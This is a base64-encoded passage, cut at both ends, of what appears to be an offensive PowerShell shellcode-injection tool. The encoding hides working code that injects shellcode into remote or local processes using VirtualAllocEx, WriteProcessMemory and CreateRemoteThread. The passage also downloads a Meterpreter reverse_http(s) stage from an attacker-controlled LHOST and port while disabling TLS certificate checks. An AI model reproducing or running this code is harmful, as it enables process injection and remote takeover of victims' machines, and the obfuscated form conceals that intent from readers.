FByb2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpCiAgICAgICAgCiAgICAgICAgaWYgKCEkaFByb2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIG9wZW4gYSBwcm9jZXNzIGhhbmRsZSBmb3IgUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAkNjRiaXRDUFUgPSAkZmFsc2UKICAgICAgICAkSXNXb3c2NCA9ICRmYWxzZQoKICAgICAgICBpZiAoJDY0Yml0Q1BVKSAjIE9ubHkgcGVyZm9ybSB0aGVzZXMgY2hlY2tzIGlmIENQVSBpcyA2NC1iaXQKICAgICAgICB7CiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlzIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQKICAgICAgICAgICAgJElzV293NjRQcm9jZXNzLkludm9rZSgkaFByb2Nlc3MsIFtSZWZdICRJc1dvdzY0KSB8IE91dC1OdWxsCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoKCEkSXNXb3c2NCkgLWFuZCAkUG93ZXJTaGVsbDMyYml0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnVW5hYmxlIHRvIGluamVjdCA2NC1iaXQgc2hlbGxjb2RlIGZyb20gd2l0aGluIDMyLWJpdCBQb3dlcnNoZWxsLiBVc2UgdGhlIDY0LWJpdCB2ZXJzaW9uIG9mIFBvd2Vyc2hlbGwgaWYgeW91IHdhbnQgdGhpcyB0byB3b3JrLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRJc1dvdzY0KSAjIDMyLWJpdCBXb3c2NCBwcm9jZXNzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnSW5qZWN0aW5nIGludG8gYSBXb3c2NCBwcm9jZXNzLicKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgIyA2NC1iaXQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgIyAzMi1iaXQgQ1BVCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KCiAgICAgICAgIyBSZXNlcnZlIGFuZCBjb21taXQgZW5vdWdoIG1lbW9yeSBpbiByZW1vdGUgcHJvY2VzcyB0byBob2xkIHRoZSBzaGVsbGNvZGUKICAgICAgICAkUmVtb3RlTWVtQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgCiAgICAgICAgaWYgKCEkUmVtb3RlTWVtQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSBpbnRvIHRoZSBwcmV2aW91c2x5IGFsbG9jYXRlZCBtZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVNZW1BZGRyLCAkU2hlbGxjb2RlLCAkU2hlbGxjb2RlLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbAoKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKCiAgICAgICAgaWYgKCRJc1dvdzY0KQogICAgICAgIHsKICAgICAgICAgICAgIyBCdWlsZCAzMi1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgNjQtYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KCiAgICAgICAgIyBBbGxvY2F0ZSBpbmxpbmUgYXNzZW1ibHkgc3R1YgogICAgICAgICRSZW1vdGVTdHViQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZVN0dWJBZGRyKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlU3R1YkFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIFdyaXRlIDMyLWJpdCBhc3NlbWJseSBzdHViIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBzcGFjZQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZVN0dWJBZGRyLCAkQ2FsbFN0dWIsICRDYWxsU3R1Yi5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBFeGVjdXRlIHNoZWxsY29kZSBhcyBhIHJlbW90ZSB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVJlbW90ZVRocmVhZC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgMCwgJFJlbW90ZVN0dWJBZGRyLCAkUmVtb3RlTWVtQWRkciwgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggcmVtb3RlIHRocmVhZCBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAjIENsb3NlIHByb2Nlc3MgaGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaFByb2Nlc3MpIHwgT3V0LU51bGwKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICB7CiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQogICAgCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgc2hlbGxjb2RlCiAgICAgICAgJEJhc2VBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJEJhc2VBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJEJhc2VBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU2hlbGxjb2RlLCAwLCAkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoKQogICAgICAgIAogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAogICAgICAgIAogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDMyCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHRocmVhZCBjYWxsIHN0dWIKICAgICAgICAkQ2FsbFN0dWJBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgaWYgKCEkQ2FsbFN0dWJBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViLiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRDYWxsU3R1YkFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgY2FsbCBzdHViIHRvIFJXWCBidWZmZXIKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRDYWxsU3R1YiwgMCwgJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCkKCiAgICAgICAgIyBMYXVuY2ggc2hlbGxjb2RlIGluIGl0J3Mgb3duIHRocmVhZAogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJENhbGxTdHViQWRkcmVzcywgJEJhc2VBZGRyZXNzLCAwLCBbSW50UHRyXTo6WmVybykKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCB0aHJlYWQuIgogICAgICAgIH0KCiAgICAgICAgIyBXYWl0IGZvciBzaGVsbGNvZGUgdGhyZWFkIHRvIHRlcm1pbmF0ZQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkVGhyZWFkSGFuZGxlLCAweEZGRkZGRkZGKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKICAgICAgICAkVmlydHVhbEZyZWUuSW52b2tlKCRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKICAgIH0KCiAgICAjIEEgdmFsaWQgcG9pbnRlciB0byBJc1dvdzY0UHJvY2VzcyB3aWxsIGJlIHJldHVybmVkIGlmIENQVSBpcyA2NC1iaXQKICAgICRJc1dvdzY0UHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIElzV293NjRQcm9jZXNzCiAgICBpZiAoJElzV293NjRQcm9jZXNzQWRkcikKICAgIHsKICAgIAkkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgIAkkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICAkNjRiaXRDUFUgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgCSQ2NGJpdENQVSA9ICRmYWxzZQogICAgfQoKICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgNCkKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJGZhbHNlCiAgICB9CgogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTWV0YXNwbG9pdCcpCiAgICB7CiAgICAgICAgaWYgKCEkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgICMgVGhlIGN1cnJlbnRseSBzdXBwb3J0ZWQgTWV0YXNwbG9pdCBwYXlsb2FkcyBhcmUgMzItYml0LiBUaGlzIGJsb2NrIG9mIGNvZGUgaW1wbGVtZW50cyB0aGUgbG9naWMgdG8gZXhlY3V0ZSB0aGlzIHNjcmlwdCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsCiAgICAgICAgICAgICMgR2V0IHRoaXMgc2NyaXB0J3MgY29udGVudHMgYW5kIHBhc3MgaXQgdG8gMzItYml0IHBvd2Vyc2hlbGwgd2l0aCB0aGUgc2FtZSBwYXJhbWV0ZXJzIHBhc3NlZCB0byB0aGlzIGZ1bmN0aW9uCgogICAgICAgICAgICAjIFB1bGwgb3V0IGp1c3QgdGhlIGNvbnRlbnQgb2YgdGhlIHRoaXMgc2NyaXB0J3MgaW52b2NhdGlvbi4KICAgICAgICAgICAgJFJvb3RJbnZvY2F0aW9uID0gJE15SW52b2NhdGlvbi5MaW5lCgogICAgICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Ugd2FudCB0byBsYXVuY2ggdGhlIHBheWxvYWQgZnJvbSB4ODYgUG93ZXJzaGVsbD8iLAogICAgICAgICAgICAgICAgICAgIkF0dGVtcHQgdG8gZXhlY3V0ZSAzMi1iaXQgc2hlbGxjb2RlIGZyb20gNjQtYml0IFBvd2Vyc2hlbGwuIE5vdGU6IFRoaXMgcHJvY2VzcyB0YWtlcyBhYm91dCBvbmUgbWludXRlLiBCZSBwYXRpZW50ISBZb3Ugd2lsbCBhbHNvIHNlZSBzb21lIGFydGlmYWN0cyBvZiB0aGUgc2NyaXB0IGxvYWRpbmcgaW4gdGhlIG90aGVyIHByb2Nlc3MuIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBsYXVuY2ggdGhlIDMyLWJpdCBwYXlsb2FkIGZyb20gMzItYml0IFBvd2VyU2hlbGwuIEV4aXQgZnVuY3Rpb24KICAgICAgICAgICAgICAgIFJldHVybgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFNpbmNlIHRoZSBzaGVsbGNvZGUgd2lsbCBydW4gaW4gYSBub25pbnRlcmFjdGl2ZSBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLCBtYWtlIHN1cmUgdGhlIC1Gb3JjZSBzd2l0Y2ggaXMgaW5jbHVkZWQgc28gdGhhdCB0aGVyZSBpcyBubyB3YXJuaW5nIHByb21wdC4KICAgICAgICAgICAgaWYgKCRNeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWydGb3JjZSddKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGVjdXRpbmcgdGhlIGZvbGxvd2luZyBmcm9tIDMyLWJpdCBQb3dlclNoZWxsOiAkUm9vdEludm9jYXRpb24iCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKWBuYG4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGVjdXRpbmcgdGhlIGZvbGxvd2luZyBmcm9tIDMyLWJpdCBQb3dlclNoZWxsOiAkUm9vdEludm9jYXRpb24gLUZvcmNlIgogICAgICAgICAgICAgICAgJENvbW1hbmQgPSAiZnVuY3Rpb24gJCgkTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSB7YG4iICsgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuU2NyaXB0QmxvY2sgKyAiYG59YG4kKCRSb290SW52b2NhdGlvbikgLUZvcmNlYG5gbiIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJENvbW1hbmRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFzY2lpLkdldEJ5dGVzKCRDb21tYW5kKQogICAgICAgICAgICAkRW5jb2RlZENvbW1hbmQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRDb21tYW5kQnl0ZXMpCgogICAgICAgICAgICAkRXhlY3V0ZSA9ICckQ29tbWFuZCcgKyAiIHwgJEVudjp3aW5kaXJcU3lzV09XNjRcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1Db21tYW5kIC0iCiAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uIC1Db21tYW5kICRFeGVjdXRlIHwgT3V0LU51bGwKCiAgICAgICAgICAgICMgRXhpdCB0aGUgc2NyaXB0IHNpbmNlIHRoZSBzaGVsbGNvZGUgd2lsbCBiZSBydW5uaW5nIGZyb20geDg2IFBvd2VyU2hlbGwKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRSZXNwb25zZSA9ICRUcnVlCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICggJFJlc3BvbnNlID0gJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAiRG8geW91IGtub3cgd2hhdCB5b3UncmUgZG9pbmc/IiwKICAgICAgICAgICAgICAgIkFib3V0IHRvIGRvd25sb2FkIE1ldGFzcGxvaXQgcGF5bG9hZCAnJCgkUGF5bG9hZCknIExIT1NUPSQoJExob3N0KSwgTFBPUlQ9JCgkTHBvcnQpIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQogICAgICAgIHsKICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBjYXJyeSBvdXQgZG93bmxvYWQgb2YgTWV0YXNwbG9pdCBwYXlsb2FkLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICBzd2l0Y2ggKCRQYXlsb2FkKQogICAgICAgIHsKICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU1NMID0gJycKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICdzJwogICAgICAgICAgICAgICAgIyBBY2NlcHQgaW52YWxpZCBjZXJ0aWZpY2F0ZXMKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHskVHJ1ZX0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJExlZ2FjeSkgCiAgICAgICAgewogICAgICAgICAgICAjIE9sZCBNZXRlcnByZXRlciBoYW5kbGVyIGV4cGVjdHMgJ0lOSVRNJyBpbiB0aGUgVVJJIGluIG9yZGVyIHRvIGluaXRpYXRlIHN0YWdlIDAKICAgICAgICAgICAgJFJlcXVlc3QgPSAiaHR0cCQoJFNTTCk6Ly8kKCRMaG9zdCk6JCgkTHBvcnQpL0lOSVRNIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSAkUmVxdWVzdCIKICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgIyBHZW5lcmF0ZSBhIFVSSSB0aGF0IHBhc3NlcyB0aGUgdGVzdAogICAgICAgICAgICAkQ2hhckFycmF5ID0gNDguLjU3ICsgNjUuLjkwICsgOTcuLjEyMiB8IEZvckVhY2gtT2JqZWN0IHtbQ2hhcl0kX30KICAgICAgICAgICAgJFN1bVRlc3QgPSAkRmFsc2UKCiAgICAgICAgICAgIHdoaWxlICgkU3VtVGVzdCAtZXEgJEZhbHNlKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEdlbmVyYXRlZFVyaSA9ICRDaGFyQXJyYXkgfCBHZXQtUmFuZG9tIC1Db3VudCA0CiAgICAgICAgICAgICAgICAkU3VtVGVzdCA9ICgoW2ludFtdXSAkR2VuZXJhdGVkVXJpIHwgTWVhc3VyZS1PYmplY3QgLVN1bSkuU3VtICUgMHgxMDAgLWVxIDkyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAkUmVxdWVzdFVyaSA9IC1qb2luICRHZW5lcmF0ZWRVcmkKCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS8kKCRSZXF1ZXN0VXJpKSIgCiAgICAgICAgfQogICAgICAgICAgIAogICAgICAgICRVcmkgPSBOZXctT2JqZWN0IFVyaSgkUmVxdWVzdCkKICAgICAgICAkV2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICRXZWJDbGllbnQuSGVhZGVycy5BZGQoJ3VzZXItYWdlbnQnLCAiJFVzZXJBZ2VudCIpCiAgICAgICAgCiAgICAgICAgaWYgKCRQcm94eSkKICAgICAgICB7CiAgICAgICAgICAgICRXZWJQcm94eU9iamVjdCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJQcm94eQogICAgICAgICAgICAkUHJveHlBZGRyZXNzID0gKEdldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEludGVybmV0IFNldHRpbmdzJykuUHJveHlTZXJ2ZXIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgaWYgdGhlcmUgaXMgbm8gcHJveHkgc2V0LCB0aGVuIGNvbnRpbnVlIHdpdGhvdXQgaXQKICAgICAgICAgICAgaWYgKCRQcm94eUFkZHJlc3MpIAogICAgICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFdlYlByb3h5T2JqZW